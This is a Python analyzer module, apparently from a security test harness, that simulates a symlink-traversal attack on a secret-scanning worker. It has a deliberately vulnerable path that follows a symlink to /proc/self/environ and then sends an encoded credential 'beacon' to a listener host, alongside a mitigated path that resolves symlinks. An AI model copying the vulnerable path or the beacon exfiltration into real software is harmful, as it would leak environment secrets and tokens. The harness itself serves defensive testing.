"""Secret-scanning analyzer (vector ``symlink_traversal``).

Vulnerable path: walk the repo and ``open()`` every file WITHOUT resolving
symlinks, so a planted symlink (``leak`` -> /proc/self/environ) leaks the worker
env. When secrets are found this way the worker emits the beacon on the repo's
behalf (the symlink repo ships no code).

Mitigated path (``resolve_symlinks``): realpath each candidate and skip any that
escapes the workdir root -- the symlink is never read, no secrets found, no
beacon.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

from .. import beacon
from ..models import AnalyzerResult
from . import AnalyzerContext
from ._common import Timer, add_step

VECTOR = "symlink_traversal"
NAME = "secret_scanner"
SCAN_TIMEOUT_S = 30

_SCAN_SCRIPT = """
import json
import sys
from pathlib import Path

from app import secret_patterns

findings = secret_patterns.scan_workdir(
    Path(sys.argv[1]),
    resolve_symlinks=(sys.argv[2] == "1"),
)
print(json.dumps(findings, sort_keys=True))
"""


def run(ctx: AnalyzerContext) -> AnalyzerResult:
    resolve = ctx.mitigations.resolve_symlinks
    with Timer() as timer:
        try:
            findings = _scan_with_env(
                ctx.workdir,
                resolve_symlinks=resolve,
                env=ctx.env,
            )
        except RuntimeError as exc:
            add_step(ctx.steps, "error", f"secret_scanner: scan failed: {exc}")
            return AnalyzerResult(
                name=NAME,
                vector=VECTOR,
                triggered=True,
                status="error",
                summary=f"secret scanner failed: {exc}",
                duration_ms=timer.ms,
            )

    # "triggered" = the scanner ran over the repo (always true for this module).
    total_secrets = sum(len(v) for v in findings.values())

    if resolve:
        add_step(
            ctx.steps,
            "info",
            "secret_scanner: resolve_symlinks ON -- symlinked paths escaping "
            "the workdir were skipped",
        )
        summary = (
            f"resolved symlinks; {total_secrets} secret(s) in {len(findings)} "
            "in-root file(s)"
        )
        return AnalyzerResult(
            name=NAME,
            vector=VECTOR,
            triggered=True,
            status="blocked",
            summary=summary,
            duration_ms=timer.ms,
        )

    add_step(
        ctx.steps,
        "warn",
        f"secret_scanner: followed symlinks; found {total_secrets} secret(s) "
        f"across {len(findings)} file(s): {sorted(findings)}",
    )

    # Vulnerable path with secrets found -> the worker beacons on the payload's
    # behalf. With strip_credentials ON, the vector still "executes" and should
    # beacon with empty exfil per the global mitigation contract.
    beacon_sent = False
    should_beacon = total_secrets > 0 or ctx.mitigations.strip_credentials
    if should_beacon:
        dotted = beacon.encode_dotted_hex(beacon.build_exfil(ctx.seeds, ctx.k8s_token))
        # block_egress is enforced by routing the worker beacon at the blackhole
        # host when set (mirrors the templating substitution for payloads).
        host = (
            "egress.blocked.invalid"
            if ctx.mitigations.block_egress
            else ctx.listener_host
        )
        beacon_sent = beacon.send_beacon(
            host, ctx.listener_port, ctx.scan_token, VECTOR, dotted
        )
        add_step(
            ctx.steps,
            "info" if beacon_sent else "warn",
            f"secret_scanner: worker beacon {'sent' if beacon_sent else 'not sent'} "
            f"(block_egress={ctx.mitigations.block_egress})",
        )

    summary = f"followed symlinks; {total_secrets} secret(s) in {len(findings)} file(s)"
    return AnalyzerResult(
        name=NAME,
        vector=VECTOR,
        triggered=True,
        status="ok",
        summary=summary,
        duration_ms=timer.ms,
    )


def _scan_with_env(
    workdir: Path,
    *,
    resolve_symlinks: bool,
    env: dict[str, str],
) -> dict[str, list[str]]:
    """Run the file walk in a child process with the scan's effective env.

    The bundled symlink points at ``/proc/self/environ``. Reading that in the
    long-lived worker process would see the worker's startup environment, not
    the per-scan env built after applying ``strip_credentials``. A short-lived
    scanner process makes the vulnerable read match real analyzer behavior.
    """
    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            _SCAN_SCRIPT,
            str(workdir),
            "1" if resolve_symlinks else "0",
        ],
        env=_child_env(env),
        capture_output=True,
        text=True,
        timeout=SCAN_TIMEOUT_S,
        check=False,
    )
    if proc.returncode != 0:
        detail = (proc.stderr or proc.stdout).strip()
        raise RuntimeError(detail[:200] or f"exit status {proc.returncode}")

    try:
        raw = json.loads(proc.stdout)
    except json.JSONDecodeError as exc:
        raise RuntimeError("scanner emitted invalid JSON") from exc
    return _coerce_findings(raw)


def _child_env(env: dict[str, str]) -> dict[str, str]:
    child_env = dict(env)
    worker_root = str(Path(__file__).resolve().parents[2])
    current_pythonpath = child_env.get("PYTHONPATH")
    child_env["PYTHONPATH"] = (
        worker_root
        if not current_pythonpath
        else worker_root + os.pathsep + current_pythonpath
    )
    return child_env


def _coerce_findings(raw: object) -> dict[str, list[str]]:
    if not isinstance(raw, dict):
        raise RuntimeError("scanner emitted non-object JSON")

    findings: dict[str, list[str]] = {}
    for path, matches in raw.items():
        if not isinstance(path, str):
            raise RuntimeError("scanner emitted non-string path")
        if not isinstance(matches, list) or not all(
            isinstance(match, str) for match in matches
        ):
            raise RuntimeError("scanner emitted invalid match list")
        findings[path] = list(matches)
    return findings
